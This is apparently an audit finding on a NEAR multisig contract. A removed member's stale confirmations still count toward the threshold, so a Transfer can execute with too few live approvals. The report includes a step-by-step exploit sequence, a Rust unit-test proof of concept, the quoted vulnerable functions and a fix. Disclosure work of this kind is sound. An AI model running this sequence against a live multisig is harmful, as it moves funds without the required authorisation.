### Title
Stale confirmations from a removed member let a Transfer request execute with fewer than `num_confirmations` live members - ([File: multisig2/src/lib.rs])

### Summary
`delete_member` only purges requests that the removed member *originated* (`r.member == member`), leaving any confirmation the removed member cast on other members' requests untouched in the `confirmations: LookupMap<RequestId, HashSet<String>>` map. `confirm` counts `confirmations.len()` without filtering for current membership, so a request can later execute after collecting fewer than `num_confirmations` live-member signatures, counting the stale, now-non-member entry.

### Finding Description
The invariant that should hold is: for any executed request `R`, `|{ s ∈ confirmations(R) : s corresponds to a current self.members entry }| >= self.num_confirmations`.

Trace:
1. `add_request` creates `confirmations(R) = {}` [1](#0-0) .
2. `confirm` inserts `member.to_string()` into `confirmations(R)` when not yet enough, or executes when `confirmations.len() as u32 + 1 >= self.num_confirmations` [2](#0-1) . Note this length check counts every string in the set, regardless of whether it still names a live member.
3. `delete_member` removes the member from `self.members` and only clears requests whose `r.member == member` (i.e., requests *proposed by* that member), not requests the member merely *confirmed*: [3](#0-2) .
4. Therefore, if member `X` confirmed some other member's request `R` (a `Transfer`) and is later removed via a separate `DeleteMember{X}` request, `confirmations(R)` still contains `X.to_string()` even though `X ∉ self.members` afterward.
5. Remaining live members then confirm `R`; the stale `X` entry is counted toward `num_confirmations`, so `R` executes (a `Promise::transfer`) with strictly fewer live-member confirmations than `num_confirmations`.

Exploit flow with `members = {A, B, C, X}`, `num_confirmations = 3`:
- `B` calls `add_request` for `Transfer` request `R` (unconfirmed).
- `X` calls `confirm(R)` → `confirmations(R) = {X}`.
- `A` calls `add_request_and_confirm` for `DeleteMember{X}` (request `R2`), `B` and `C` call `confirm(R2)` → 3 confirmations, `R2` executes, removing `X` from `self.members`. `delete_member` does not touch `confirmations(R)` because `R`'s originating member is `B`, not `X`.
- `A` calls `confirm(R)` → `confirmations(R) = {X, A}` (still `< 3`).
- `C` calls `confirm(R)` → `confirmations.len() + 1 == 3 >= num_confirmations` → `execute_request(R)` runs, transferring NEAR, even though only `A` and `C` (2 live members) actually authorized it.

None of the existing guards (`assert_self_request`, `assert_valid_request`, `current_member`) filter `confirmations(R)` by current membership at confirm/execute time; `current_member` is only used to validate the *caller* of `confirm`, not to re-validate previously stored entries.

### Impact Explanation
NEAR is moved out of the multisig account via a `Transfer` action executed with fewer than `num_confirmations` **live** members having actually confirmed it — this is explicitly called out as Critical impact ("a multisig request executed below `num_confirmations` live members"). The attack is repeatable: any member who is later removed and had previously confirmed still-pending requests leaves an exploitable stale entry; multiple such requests can be primed before a removal.

### Likelihood Explanation
This requires only actions available to legitimate multisig members acting within the normal protocol (proposing, confirming, and removing a member) — no special privilege beyond being one of the `N` members, and per the threat model any attacker who is a multisig member can trigger this without extra cost. The only precondition is ordering: get a member to confirm a pending request, then have that member removed via a separate `DeleteMember` request before the removed member's stale confirmation is "spent" by the remaining live members' confirmations. This is straightforward to orchestrate and does not require any race condition against nearcore, just sequencing of transactions.

### Recommendation
When executing `DeleteMember`, scan all pending requests' `confirmations` sets and remove any entry equal to the removed member's `to_string()`, not just requests originated by that member. Alternatively, change `confirm`/`execute_request` to recompute the confirmation count by filtering `confirmations(R)` against `self.members` at the time of counting, rather than trusting the raw `HashSet` length.

### Proof of Concept
```rust
#[test]
fn stale_confirmation_after_delete_member_executes_below_threshold() {
    // members = {A, B, C, X}, num_confirmations = 3
    let mut c = MultiSigContract::new(members_abcx(), 3);

    // B proposes Transfer request R (not self-originated by X)
    testing_env!(context_with_key(pk_b(), 0));
    let r = c.add_request(MultiSigRequest {
        receiver_id: alice(),
        actions: vec![MultiSigRequestAction::Transfer { amount: 1_000.into() }],
    });

    // X confirms R -> confirmations(R) = {X}
    testing_env!(context_with_key(pk_x(), 0));
    c.confirm(r);
    assert_eq!(c.get_confirmations(r).len(), 1);

    // A proposes+confirms DeleteMember{X} (R2), B and C confirm -> executes, removes X
    testing_env!(context_with_key(pk_a(), 0));
    let r2 = c.add_request_and_confirm(MultiSigRequest {
        receiver_id: alice(),
        actions: vec![MultiSigRequestAction::DeleteMember { member: member_x() }],
    });
    testing_env!(context_with_key(pk_b(), 0));
    c.confirm(r2);
    testing_env!(context_with_key(pk_c(), 0));
    c.confirm(r2);
    // X removed from members; confirmations(R) still contains X's entry
    assert!(!c.members_contains(&member_x()));
    assert_eq!(c.get_confirmations(r).len(), 1); // stale entry survives

    // A and C confirm R -> reaches len()+1 >= 3 using stale X entry
    testing_env!(context_with_key(pk_a(), 0));
    c.confirm(r); // confirmations(R) = {X, A}, len 2 < 3, inserted
    testing_env!(context_with_key(pk_c(), 0));
    // BEFORE this call: confirmations(R) = {X, A}; only A, C are live members among {X, A, C}
    let live_confirmers = c.get_confirmations(r).iter()
        .filter(|s| c.members_contains_str(s))
        .count();
    assert!(live_confirmers + 1 < 3); // only 2 live confirmations would back execution
    let result = c.confirm(r); // executes R via execute_request, transferring NEAR
    // Assert execution happened despite < num_confirmations live members
    assert!(matches!(result, PromiseOrValue::Promise(_)));
}
```
This test demonstrates `confirmations(R)` containing a non-member (`X`) entry counted toward reaching `num_confirmations`, causing `execute_request` (and its `Transfer`) to run with only 2 live-member confirmations against a required 3.

    pub fn confirm(&mut self, request_id: RequestId) -> PromiseOrValue<bool> {
        self.assert_valid_request(request_id);
        let member = self
            .current_member()
            .unwrap_or_else(|| env::panic_str("Must be validated above"));
        let mut confirmations = self.confirmations.get(&request_id).unwrap();
        assert(
            !confirmations.contains(&member.to_string()),
            "Already confirmed this request with this key",
        );
        if confirmations.len() as u32 + 1 >= self.num_confirmations {
            let request = self.remove_request(request_id);
            /********************************
            NOTE: If the tx execution fails for any reason, the request and confirmations are removed already, so the client has to start all over
            ********************************/
            self.execute_request(request)
        } else {
            confirmations.insert(member.to_string());
            self.confirmations.insert(&request_id, &confirmations);
            PromiseOrValue::Value(true)
        }
    }

    fn delete_member(&mut self, promise: Promise, member: MultisigMember) -> Promise {
        assert(
            self.members.len() - 1 >= self.num_confirmations as u64,
            "Removing given member will make total number of members below number of confirmations",
        );
        // delete outstanding requests by public_key
        let request_ids: Vec<u32> = self
            .requests
            .iter()
            .filter_map(|(k, r)| if r.member == member { Some(k) } else { None })
            .collect();
        for request_id in request_ids {
            // remove confirmations for this request
            self.confirmations.remove(&request_id);
            self.requests.remove(&request_id);
        }
        // remove num_requests_pk entry for member
        self.num_requests_pk.remove(&member.to_string());
        self.members.remove(&member);
        match member {
            MultisigMember::AccessKey { public_key } => promise.delete_key(public_key.into()),
            MultisigMember::Account { account_id: _ } => promise,
        }
    }
